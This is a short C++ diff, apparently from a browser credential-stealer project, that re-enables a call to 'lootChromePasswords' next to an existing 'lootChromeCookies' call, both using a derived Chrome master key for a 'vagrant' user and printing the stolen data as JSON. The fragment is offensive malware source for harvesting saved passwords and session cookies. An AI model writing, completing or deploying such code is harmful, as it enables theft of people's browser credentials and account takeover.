@@ -9,8 +9,8 @@ int main() {
 	getMasterKey(masterKey, "vagrant");
 	printUCharAsHex(masterKey, MASTER_KEY_SIZE);
 
-	// json passwords = lootChromePasswords((const unsigned char*) masterKey, "vagrant");
-	// std::cout << "passwords: " << passwords.dump(4) << std::endl;
+	json passwords = lootChromePasswords((const unsigned char*) masterKey, "vagrant");
+	std::cout << "passwords: " << passwords.dump(4) << std::endl;
 
 	json cookies = lootChromeCookies((const unsigned char*) masterKey, "vagrant");
 	cout << "cookies: " << cookies.dump(4) << endl;
